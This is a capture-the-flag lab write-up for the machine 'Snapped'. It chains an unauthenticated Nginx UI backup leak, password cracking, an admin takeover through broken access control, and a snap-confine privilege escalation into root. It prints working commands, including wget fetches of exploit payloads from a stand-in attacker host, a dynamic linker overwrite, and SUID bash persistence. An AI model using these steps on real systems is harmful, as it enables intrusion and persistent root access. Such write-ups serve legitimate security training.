# Snapped — Full Writeup

## Overview

The objective of this machine was to obtain initial access through the exposed web infrastructure and then escalate privileges to `root`.

The full compromise chain was achieved through:

1. external enumeration of the attack surface;
2. virtual host discovery;
3. identification of an exposed **Nginx UI** instance;
4. exploitation of an unauthenticated backup disclosure in **Nginx UI 2.3.2** (`CVE-2026-27944`);
5. extraction and decryption of sensitive application data;
6. recovery of password hashes and successful password cracking;
7. SSH access as `jonathan` via credential reuse;
8. abuse of insecure authorization logic in the local Nginx UI API;
9. takeover of the `admin` account by resetting its password through the backend API;
10. local privilege escalation through a **snap-confine / snapd** sandbox escape (`CVE-2026-3888`).

This compromise demonstrates how an exposed administrative interface, weak secret handling, broken access control, and a local privilege escalation can be chained into full system compromise.

---

## 1. Initial Reconnaissance

The first step was a full TCP port scan against the target:

```bash
nmap -p- --min-rate 5000 -T4 snapped.htb
```

The scan revealed only two open services:

- `22/tcp` → SSH
- `80/tcp` → HTTP

With such a limited external surface, the most likely entry point was the web service exposed on port `80`.

---

## 2. Web Enumeration

Browsing to:

```text
http://snapped.htb
```

returned a static page with no immediately useful functionality.

A standard content discovery pass was then performed:

```bash
ffuf -u http://snapped.htb/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/common.txt
```

This did not reveal any meaningful application paths or administrative endpoints on the base virtual host.

At this stage, the combination of a minimal web response, no useful directories, and no alternate exposed services suggested that the real attack surface might be hosted behind an undiscovered virtual host.

---

## 3. Virtual Host Discovery

Subdomain and virtual host fuzzing was performed using the `Host` header:

```bash
ffuf -u http://snapped.htb/ \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-H "Host: FUZZ.snapped.htb"
```

This identified the additional virtual host:

```text
admin.snapped.htb
```

The hostname was then added locally:

```bash
echo "10.10.X.X admin.snapped.htb" >> /etc/hosts
```

This was the first meaningful pivot, since the primary host provided no practical attack surface.

---

## 4. Identification of Nginx UI

Navigating to:

```text
http://admin.snapped.htb
```

revealed an administrative interface for **Nginx UI**.

Key observations:

- the application used a JavaScript-driven SPA frontend;
- backend functionality appeared to be exposed under `/api/`;
- the service was clearly administrative in nature and therefore high value.

The application version was retrieved directly:

```bash
curl -s http://admin.snapped.htb/version.json
```

Response:

```json
{"version":"2.3.2"}
```

This confirmed the exact product and version in use.

---

## 5. Vulnerability Identification — CVE-2026-27944

The exposed version, **Nginx UI 2.3.2**, was vulnerable to:

```text
CVE-2026-27944
```

### Vulnerability Summary

This vulnerability allowed unauthenticated users to access the backup export endpoint:

```text
/api/backup
```

The issue was critical because:

1. the endpoint lacked authentication;
2. the returned backup contained sensitive application data;
3. the encryption material required to decrypt the backup was leaked through response headers.

In practice, this meant that a remote unauthenticated attacker could download a backup, recover the encryption key and IV, decrypt the archive, and extract secrets and stored credentials.

---

## 6. Backup Extraction

The vulnerable endpoint was queried as follows:

```bash
curl -sD headers.txt -o backup.bin http://admin.snapped.htb/api/backup
```

The response headers contained the security material required to decrypt the backup. These headers were inspected with:

```bash
grep -i "X-Backup-Security" headers.txt
```

The leaked values were Base64-encoded, so they were decoded and converted to hexadecimal for OpenSSL:

```bash
echo "<KEY>" | base64 -d | xxd -p
echo "<IV>"  | base64 -d | xxd -p
```

The downloaded file was then treated as an archive:

```bash
mv backup.bin backup.zip
unzip backup.zip
```

This extraction produced the encrypted internal archive, typically named:

```text
nginx-ui.zip
```

---

## 7. Backup Decryption

Using the recovered AES key and IV, the internal archive was decrypted:

```bash
openssl enc -d -aes-256-cbc \
-K <KEY_HEX> \
-iv <IV_HEX> \
-in nginx-ui.zip \
-out nginx-ui.dec.zip
```

The decrypted archive was then extracted:

```bash
unzip nginx-ui.dec.zip
```

This yielded sensitive files including:

- `app.ini`
- `database.db`

At this point, the attack had moved from external reconnaissance to direct secret and credential recovery.

---

## 8. Sensitive Data Recovery

The application configuration file contained a critical secret:

```ini
JwtSecret = 6c4af436-035a-4942-9ca6-172b36696ce9
```

This value was highly relevant because Nginx UI used JWT-based authentication for its backend API. Knowing the signing secret meant that authenticated API interaction and token forgery became possible.

The extracted SQLite database was also a priority target because it stored the application users and their password hashes.

---

## 9. Database Inspection

The SQLite database was opened locally:

```bash
sqlite3 database.db
```

The schema was enumerated:

```sql
.tables
```

The `users` table was then queried:

```sql
SELECT * FROM users;
```

This revealed at least two users:

- `admin`
- `jonathan`

The password fields contained bcrypt hashes.

---

## 10. Password Cracking

The relevant hash was exported and attacked using `john` with the `rockyou` wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

This successfully recovered the password for `jonathan`:

```text
jonathan : linkinpark
```

This was a decisive finding because it provided a valid local account credential and created an immediate opportunity to test password reuse over SSH.

---

## 11. Initial Access via SSH

SSH authentication as `jonathan` succeeded using the cracked password:

```bash
ssh jonathan@snapped.htb
```

Once connected, the user flag was retrieved:

```bash
cat user.txt
```

At this point, initial access to the machine had been obtained.

---

## 12. Post-Exploitation: Local Service and API Analysis

After obtaining a shell as `jonathan`, attention shifted back to Nginx UI from the host perspective.

A backend service was listening locally on:

```text
http://127.0.0.1:9000
```

This was important because local services often expose functionality that is either hidden or filtered externally.

### JWT Analysis

Inspection of an existing token showed a structure similar to:

```json
{
  "name": "jonathan",
  "user_id": 2,
  "iss": "Nginx UI",
  "sub": "jonathan"
}
```

Since the JWT secret had already been recovered from the backup, it was possible to generate valid forged tokens for authenticated API interaction.

---

## 13. Local API Enumeration

Several routes were tested against the local API:

```bash
curl -s http://127.0.0.1:9000/api/init
curl -s http://127.0.0.1:9000/api/modules
curl -s http://127.0.0.1:9000/api/status
curl -s http://127.0.0.1:9000/api/logs
```

Most returned:

```json
{"message":"not found"}
```

This indicated that the API surface was not trivially discoverable through guessing and was likely driven by the frontend application.

The next step was therefore to target likely object-based endpoints directly, such as user management.

---

## 14. User Enumeration Through the Backend API

Using a valid JWT, the users endpoint was queried:

```bash
curl -s http://127.0.0.1:9000/api/users \
-H "Authorization: $JWT" | jq
```

This returned the application users, including:

- `admin` (`id=1`)
- `jonathan` (`id=2`)

This confirmed that:

1. the current user context had access to sensitive user-management functionality;
2. user object identifiers were predictable and directly exposed.

---

## 15. Broken Access Control in User Management

The next phase was to determine whether a non-admin user could perform privileged operations against the API.

### 15.1 Creating a New User as a Non-Admin

A new user creation request was sent with the token associated to `jonathan`:

```bash
curl -s -X POST http://127.0.0.1:9000/api/users \
-H "Authorization: $JWT" \
-H "Content-Type: application/json" \
-d '{"name":"pwned","password":"Pwned123!","status":true}'
```

This succeeded.

That result demonstrated a serious authorization flaw: a non-administrative account was able to invoke privileged user-management functionality.

### 15.2 Attempted Direct Role Escalation

A direct privilege escalation attempt was then made by injecting an administrative field:

```bash
curl -s -X POST http://127.0.0.1:9000/api/users \
-H "Authorization: $JWT" \
-H "Content-Type: application/json" \
-d '{"name":"superpwn","password":"x","is_admin":true}'
```

This did not create an administrative user.

This indicated that the server did not trust arbitrary privilege flags in the request body, but it still failed to restrict access to privileged account management features.

### 15.3 Password Reset Attempts Against the Admin Account

Several common update patterns were tested against the `admin` account:

```text
PUT /api/users/1
PATCH /api/users/1
POST /api/users/1/password
```

These attempts were unsuccessful.

However, continued testing revealed that the application accepted a direct update through a different route pattern.

---

## 16. Administrative Account Takeover

A `POST` request directly against the `admin` user object succeeded in changing its password:

```bash
curl -s -X POST http://127.0.0.1:9000/api/users/1 \
-H "Authorization: $JWT" \
-H "Content-Type: application/json" \
-d '{"name":"admin","password":"Pwned123!"}'
```

This was the most critical application-layer finding after initial access.

### Security Impact

A non-admin authenticated user was able to modify the credentials of the existing administrator account.

This constitutes a severe **broken access control** issue because:

- user object IDs were directly exposed;
- the backend failed to enforce ownership or privilege checks;
- sensitive account operations were available to lower-privileged users.

Once the password was changed, it was possible to authenticate as `admin`.

---

## 17. Administrative API Access

After resetting the password, a new administrator JWT was obtained:

```bash
ADMIN_TOKEN=<jwt_admin>
```

The administrative settings endpoint was then queried:

```bash
curl -s http://127.0.0.1:9000/api/settings \
-H "Authorization: $ADMIN_TOKEN"
```

The response exposed operational details including:

- Nginx-related commands;
- terminal configuration;
- filesystem paths;
- service settings.

This confirmed full administrative control over the Nginx UI application.

---

## 18. Attempted Remote Code Execution Through Nginx UI Configuration

With administrative access to the application, the next goal was to convert this control into operating system command execution.

### 18.1 Command Injection Attempts

The first approach was to modify command-related settings such as:

```json
"reload_cmd": "id > /tmp/pwned"
"test_config_cmd": "id > /tmp/pwned"
```

These attempts failed because the application either validated accepted values strictly or restored them to safe defaults.

No arbitrary command execution was achieved through direct configuration injection.

### 18.2 Nginx Configuration Abuse Attempts

A second approach was to abuse Nginx configuration management itself by attempting to expose the filesystem, for example with directives such as:

```nginx
root /
autoindex on
```

This also failed due to:

- configuration validation errors;
- unsuccessful reload attempts;
- insufficient runtime privileges;
- inability to coerce Nginx into serving arbitrary files.

At this point, the application layer had been fully exploited from an authorization perspective, but it did not provide a clean path to direct code execution as `root`.

A local privilege escalation path was therefore required.

---

## 19. Local Enumeration for Privilege Escalation

System-level enumeration revealed the presence of Snap and a vulnerable version of `snapd`.

Version check:

```bash
snap --version
```

Relevant result:

```text
snapd 2.63.1
```

The system also contained a SUID copy of `snap-confine`:

```bash
ls -l /usr/lib/snapd/snap-confine
```

Output:

```text
-rwsr-xr-x root root /usr/lib/snapd/snap-confine
```

This aligned with a known local privilege escalation in the Snap stack:

```text
CVE-2026-3888
```

---

## 20. Privilege Escalation — CVE-2026-3888

### 20.1 Vulnerability Summary

The privilege escalation relied on a vulnerability in the Snap sandboxing mechanism involving `snap-confine`.

The exploit chain abused:

- mount namespace handling;
- a race condition in directory management;
- privileged execution within the Snap confinement process;
- overwrite of the dynamic linker (`ld-linux-x86-64.so.2`);
- re-entry into the SUID program to obtain code execution as `root`.

This was not a trivial one-shot exploit and required timing and namespace manipulation.

### 20.2 Environmental Condition: `/tmp` Cleanup Timer

Inspection of the systemd timer used for temporary file cleanup showed an aggressive schedule:

```bash
systemctl cat systemd-tmpfiles-clean.timer
```

Important values included:

```text
OnBootSec=1m
OnUnitActiveSec=1m
```

This meant `/tmp` was cleaned every minute.

From an exploitation perspective, this mattered because the attack relied on operating inside a namespace and race window under `/tmp`. The timer reduced stability and made precise execution necessary.

---

## 21. Exploit Preparation

The exploit required multiple terminals.

### Terminal 1 — Race Setup

A loop was started inside `/tmp` to maintain activity and help stabilize the race:

```bash
cd /tmp
echo $$
while true; do touch .; sleep 1; done
```

The shell PID was noted because subsequent steps referenced the process working directory through `/proc/<PID>/cwd`.

### Terminal 2 — Entering the Snap Namespace

A `snap-confine` invocation was used to enter the target namespace:

```bash
env -i SNAP_INSTANCE_NAME=firefox \
/usr/lib/snapd/snap-confine --base core22 \
snap.firefox.hook.configure /bin/bash
```

Once inside that context, the current working directory and PID were noted:

```bash
cd /tmp
echo $$
```

### Terminal 3 — Exploit Staging

From the attacker-controlled host, the exploit helper files were transferred. The relevant payload files were:

- `firefox_2404`
- `librootshell.so`

When applicable, the source files and helper material used for this stage are stored in the `/Files` directory of the same GitHub repository.

They were downloaded to the target as follows:

```bash
cd /proc/<PID>/cwd

wget http://ATTACKER/firefox_2404
wget http://ATTACKER/librootshell.so

chmod +x firefox_2404
./firefox_2404 ./librootshell.so
```

A successful swap produced output similar to:

```text
[+] SWAP DONE
```

This indicated that the dynamic linker replacement stage had succeeded.

---

## 22. Triggering the Privilege Escalation

After the race completed successfully, the namespace was accessed through `/proc`:

```bash
PID=$(cat race_pid.txt)
cd /proc/$PID/root
```

A shell binary was prepared within the namespace:

```bash
cp /usr/bin/busybox ./tmp/sh
```

The malicious shared object was then written over the dynamic linker path visible within that namespace:

```bash
cat librootshell.so > \
./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
```

This was the critical exploit step. By replacing the loader used during privileged execution, subsequent execution of the vulnerable SUID binary caused attacker-controlled code to run as `root`.

---

## 23. Obtaining a Root Shell

The SUID binary was then executed again in the crafted context:

```bash
env -i SNAP_INSTANCE_NAME=firefox \
/usr/lib/snapd/snap-confine --base core22 \
snap.firefox.hook.configure \
/usr/lib/snapd/snap-confine
```

The result was a root shell.

Verification:

```bash
id
```

Expected output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

At this stage, full system compromise had been achieved.

---

## 24. Optional Persistence

To retain privileged access, a SUID copy of `bash` was created inside a writable Snap path:

```bash
cp /bin/bash /var/snap/firefox/common/bash
chmod 4755 /var/snap/firefox/common/bash
```

This allowed privileged shell re-entry with:

```bash
/var/snap/firefox/common/bash -p
```

This step was not required to complete the machine, but it demonstrated persistence after successful privilege escalation.

---

## 25. Root Flag

With root access established, the final flag was retrieved:

```bash
cat /root/root.txt
```

---

## 26. Final Attack Chain

The full compromise path can be summarized as follows:

1. enumerate the external attack surface;
2. discover `admin.snapped.htb` through virtual host fuzzing;
3. identify **Nginx UI 2.3.2** on the administrative virtual host;
4. exploit **CVE-2026-27944** to retrieve an unauthenticated backup;
5. recover the backup encryption key and IV from response headers;
6. decrypt the archive and extract configuration and database data;
7. recover bcrypt password hashes and crack `jonathan`'s password;
8. reuse the credential over SSH to obtain initial access;
9. leverage the recovered JWT secret to interact with the local Nginx UI API;
10. exploit broken access control on `/api/users` to reset the `admin` password;
11. authenticate as the application administrator and enumerate settings;
12. determine that direct application-to-root RCE was not practical through configuration abuse;
13. identify vulnerable `snapd` / `snap-confine` components locally;
14. exploit **CVE-2026-3888** to overwrite the dynamic linker in a privileged execution path;
15. re-execute `snap-confine` and obtain a root shell.

---
